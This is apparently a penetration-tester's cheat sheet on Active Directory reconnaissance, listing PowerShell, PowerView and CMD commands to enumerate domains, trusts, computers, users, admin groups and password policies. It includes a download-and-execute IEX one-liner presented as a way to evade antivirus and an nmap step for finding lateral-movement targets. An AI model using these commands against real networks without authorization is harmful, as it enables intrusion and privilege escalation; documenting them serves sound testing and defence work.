# Active Directory - Domain Recon

### Overview

The following tools needs an authenticated Domain access.

######  Powershell Active-Directory module

The Active-Directory module for Windows PowerShell is a PowerShell module that
consolidates a group of cmdlets, that can be used to retrieve information and
manage Active Directory domains.  
The *Remote Server Administration Tools (RSAT)* must be installed and
activated to use the module on a Windows based computer.

###### PowerSploit PowerView

PowerView is a PowerShell tool to gain network situational awareness on Windows
domains. It contains a set of pure-PowerShell replacements for various windows
"net" commands, which utilize PowerShell AD hooks and underlying Win32 API
functions to perform useful Windows domain functionality.

It also implements various useful metafunctions, including some custom-written
user-hunting functions which will identify where on the network specific users
are logged into. It can also check which machines on the domain the current
user has local administrator access on. Several functions for the enumeration
and abuse of domain trusts also exist.

PowerSploit can trigger antivirus softwares. To bypass such controls, inject
it directly in memory:

```
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials

# Master fork - Stable
IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1’)

# Empire fork - Maintained
IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1')
```

### MISC

To execute the commands below as the identify of another user, two options are
available:

```
# runas
runas /NetOnly /user:<DOMAIN>\<USERNAME> powershell.exe

# For the commands supporting PSCredential
$secpasswd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $secpasswd)
```

### Forest

To retrieve forest information, the following commands can be used:

```
# PowerShell Active-Directory module
Get-ADForest
Get-ADForest -Identity <FOREST>
Get-ADForest -Current LoggedOnUser
Get-ADForest -Current LocalComputer

# PowerView
Get-NetForest [[-Forest] <String>] [[-Credential] <PSCredential>]
Get-NetForest
Get-NetForest -Forest <FOREST>
```

### Domain

To retrieve domain information, the following commands can be used:

```
# CMD
echo %userdomain%
systeminfo | findstr /B /C:"<DOMAIN>"
wmic computersystem get <DOMAIN>

# PowerShell Active-Directory module
Get-ADDomain
Get-ADDomain <DOMAIN>
Get-ADDomain -Current LoggedOnUser
Get-ADDomain -Current LocalComputer

# PowerView
Get-NetDomain [[-Domain] <String>] [[-Credential] <PSCredential>]
Get-NetDomain
Get-NetDomain -Domain <DOMAIN>
```

### Forest and domain trust relationships

Trust relationships define an administrative and security link between two
Windows forests or domains. They enable a user to access resources that are
located in a forest or domain that’s different from the user’s proper forest
or domain.

*Directions*

A trust relationship can be:
  - one-way, given by one forest or domain, the trusting object, to another
  domain or forest, the trusted object
  - two-way, meaning permissions extend mutually from both objects  

*Transitivity*

A transitive trust is a trust that is extended not only to the directly trusted
object, but also to each objects that the trusted object trusts.

*Default and configured trusts*

All domains in a forest trust each others by default. External trusts can also
be configured between domains of different forests.  

The following different types of trusts exist in Active Directory:

| Trust type | Direction | Transitivity | Description |
|------------|-----------|--------------|-------------|
| Parent-Child | Two-way | Transivite | Created automatically between a child domain and its domain parent |
| Tree-Root | Two-way | Transitive | Created automatically when a new Tree is added to a forest |
| Shortcut   | One-way or two-way | Transitive | Created manually to improve performance between two domains in the same forest|
| External | One or two-way | Non-transitive by default | Manually created trust between domains of different forests |  
| Realm | One-way or two way | Transitive or non-transitive | Manually created trusts between an Active Directory forest and a non-Windows Kerberos directory |

To retrieve the trusts affecting a forest or domain, the following commands can
be used:

```
# All trusted domain objects in a forest
Get-ADTrust -Filter *
Get-ADTrust -Filter * | Ft Name, Direction, DisallowTransivity, SIDFilteringQuarantined, SIDFilteringForestAware

nltest /trusted_domains
```

### Computers

###### Computer details

To retrieve specific computer information or list the computers in the domain,
the following commands can be used:

```
# Active-Directory module
Get-ADComputer <IDENTITY> -Properties * # IDENTITY: Computer distinguished name (DN), GUID, SID or SAM
Get-ADComputer -Filter * -Property * # All computers, all properties
Get-ADComputer -Filter * -Properties IPv4Address | FT Name,DNSHostName,IPv4Address -A
Get-ADComputer -Filter * -Property * | Export-CSV ADcomputerslist.csv -NoTypeInformation -Encoding UTF8

# PowerView
Get-NetComputer [[-ComputerName] <String>] [[-SPN] <String>] [[-OperatingSystem] <String>] [[-ServicePack] <String>] [[-Filter] <String>] [-Printers] [-Ping] [-FullData] [[-Domain] <String>] [[-DomainController] <String>] [[-ADSpath] <String>] [[-SiteName] <String>] [-Unconstrained] [[-PageSize] <Int32>] [[-Credential] <PSCredential>]
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer -ComputerName <COMPUTERNAME>
Get-NetComputer -ComputerName <COMPUTERNAME> -Domain <DOMAIN> -DomainController <DC>
Get-NetComputer -Ping
```

###### Computer search

To search for computers the following commands can be used:

```
# Active-Directory module
Get-ADComputer -Filter <FILTER> # ex: 'Description -like "*DUPONT*"'
Get-ADComputer -SearchBase "CN=Computers,DC= User01,DC=com"

# PowerView
Get-NetComputer -ComputerName <COMPUTERNAME> # wildcard accepted
Get-NetComputer -SPN <SPN> # wildcard accepted
Get-NetComputer -OperatingSystem <OS> # wildcard accepted
Get-NetComputer -Filter <FILTER> # ex: "(description=*admin*)"
Get-NetComputer -ADSpath <PATH> # ex: "LDAP://OU=secret,DC=testlab,DC=local"
```

###### Domain Controllers

To list the domain controllers in the current or specified domain or forest,
the following commands can be used:

```
# CMD
nltest /dclist:<DOMAIN>

# Active-Directory module
Get-ADDomainController -Filter *
Get-ADGroupMember 'Domain Controllers'
Get-ADComputer -LDAPFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
(Get-ADForest).Domains | %{ Get-ADDomainController -Filter * -Server $_ } # All DC for all domains in current forest

# PowerView - returns domain controllers for the active or specified domain
Get-NetDomainController [[-Domain] <String>] [[-DomainController] <String>] [-LDAP]  [[-Credential] <PSCredential>]
Get-NetDomainController
Get-NetDomainController -Domain <DOMAIN>
```

###### Network scan

AD queries can be used in combination with a network scan tool, such as nmap,
to quickly identity computers running specific services.

Example for quickly gathering the servers and computers running SMB, which
could be used for lateral movement:

```
Get-ADComputer -Server RFF.FERRE -Filter  * | Ft DNSHostName | Out-File -filepath <ADOUTFILE>
nmap -v -p 445 -oG nmap_ad_servers_445.gnmap -iL <ADOUTFILE>
grep Up nmap_ad_servers_445.gnmap | cut -d ' ' -f 2 > <ADOUTFILE445>
```

### Users

###### User details

To retrieve specific user information or list the users in the domain, the following commands can be used:

```
# Active-Directory module
Get-ADUser <IDENTITY> -Properties * # IDENTITY: User distinguished name (DN), GUID, SID or SAM
Get-ADUser -Filter * -SearchBase "OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM"
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A

# PowerView
Get-NetUser [[-UserName] <String>] [-Domain <String>] [-DomainController <String>] [-ADSpath <String>] [-Filter <String>] [-SPN] [-AdminCount] [-Unconstrained] [-AllowDelegation] [[-Credential] <PSCredential>]
Get-NetUser
Get-NetUser -UserName <USERNAME> # wildcard accepted
Get-NetUser -Domain <DOMAIN> -DomainController <DC>
Get-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"
Get-NetUser -Filter <FILTER> # ex: "(description=*admin*)"
```

###### User search

To search for users the following commands can be used:

```
# Active-Directory module - Get-ADUser
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A
Get-ADUser -Filter * -SearchBase "OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM"

# PowerView - Get-NetUser
Get-NetUser -UserName <USERNAME> # wildcard accepted
Get-NetUser -Filter <FILTER> # ex: "(description=*admin*)"
Get-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"
```

###### Enterprise and Domain Admins

List the DA and protected users (adminCount = 1) of the domain:

```
# Protected users
Get-ADUser -LDAPFilter "(objectcategory=person)(samaccountname=*)(admincount=1)"

# Members of the "Enterprise Admins" group. EA group name may vary.
Get-ADGroupMember -Identity "Enterprise Admins" -Recursive

# Members of the "Domain Admins" group. DA group name may vary.
Get-ADGroupMember "Domain Admins" -Recursive

# PowerView
Get-NetUser -AdminCount # users with adminCount=1.
```

To check if the current user is a Domain Admin, a listing of the "C:" drive of
a domain controller can be attempted:

```
dir \\<DC>\C$
```

### Groups

###### Enumerate groups

The following commands can be used to enumerate the domain groups and the
members of a specific group:

```
# CMD
net group /domain

# Active-Directory module
# IDENTITY: Group distinguished name (DN), GUID, SID or SAM
Get-ADGroupMember -Recursive -Identity <IDENTITY>
Get-ADGroup -Identity <IDENTITY> | Select-Object  -expandProperty member
Get-ADGroup -Filter *
Get-ADGroup -Identity <IDENTITY> -Properties member
Get-ADGroup -Filter 'GroupCategory -eq "Security" -and GroupScope -ne "DomainLocal"'
Get-ADGroup -SearchBase "OU=secret,DC=testlab,DC=local"

# PowerView
Get-NetGroup [[-GroupName] <String>] [[-SID] <String>] [[-UserName] <String>] [[-Filter] <String>] [[-Domain] <String>] [[-DomainController] <String>] [[-ADSpath] <String>] [-AdminCount] [-FullData] [[-Credential] <PSCredential>]
Get-NetGroup -GroupName <GROUPNAME> # supports wildcards
Get-NetGroup -Filter <FILTER> # example: "(description=*admin*)" / "(description=*<USERNAME>*)"
Get-NetGroup -GroupName *admin* -AdminCount
Get-NetGroup -ADSpath <PATH> # example: "LDAP://OU=secret,DC=testlab,DC=local"
```

###### User's groups

The following commands can be used to retrieve the groups the specified user is
member of:

```
# Active-Directory module
Get-ADPrincipalGroupMembership <IDENTITY> # IDENTITY: Group distinguished name (DN), GUID, SID or SAM
Get-ADUser <IDENTITY> | Get-ADPrincipalGroupMembership
Get-ADUser -Server <DC> <IDENTITY> | Get-ADPrincipalGroupMembership
Get-ADPrincipalGroupMembership <IDENTITY> | Where-Object {$_.name -like '*adm*'}

# PowerView
Get-NetGroup -UserName <USERNAME>
```

###### Local groups

The following commands can be used to enumerate the local groups on a specific
computer:

```
# PowerView
Get-NetLocalGroup [[-ComputerName] <String[]>] [-ComputerFile <String>] [-GroupName <String>] [-ListGroups] [-Recurse] [<CommonParameters>]
Get-NetLocalGroup -ListGroups -Recurse
Get-NetLocalGroup # Defaults to list the members of the "Administrators" groups
Get-NetLocalGroup  -GroupName <GROUPNAME> # Query the users of the specified local group
```

### Password and account lockout policies

The following commands can be used to determine the password and account lockout policies enforced on the domain:

```
$RootDSE = Get-ADRootDSE -Server <DOMAIN>

# Password policy
Get-ADObject $RootDSE.defaultNamingContext -Server <DOMAIN> -Property minPwdAge, maxPwdAge, minPwdLength, pwdHistoryLength, pwdProperties

# Account lockout policy
Get-ADObject $RootDSE.defaultNamingContext -Property lockoutDuration, lockoutObservationWindow, lockoutThreshold
```

Default password complexity rule (pwdProperties : 1) of Active Directory
requires that passwords contain characters from three of the following five
categories:

  - Uppercase characters of European languages
  - Lowercase characters of European languages
  - Base 10 digits (0 through 9)
  - Nonalphanumeric characters: ```~!@#$%^&*_-+=\`|\(){}[]:;"'<>,.?/```
  - Any Unicode character that is categorized as an alphabetic character but is
    not uppercase or lowercase (includes Unicode characters from Asian
    languages)

Note that, for some reason, the minPwdAge and maxPwdAge password policy
properties and the lockout time is expressed in negative nanoseconds and must
be divided by "-600000000" to be converted in effective
minutes of lockout.

The following Powershell one-liner can be used to this end:

```
X / - 600000000 / (60*24)

$AccountPolicy | Select @{n="PolicyType";e={"Account Lockout"}}, DistinguishedName, @{n="lockoutDuration";e={"$($_.lockoutDuration / -600000000) minutes"}}, @{n="lockout
ObservationWindow";e={"$($_.lockoutObservationWindow / -600000000) minutes"}}, lockoutThreshold | Format-List
```
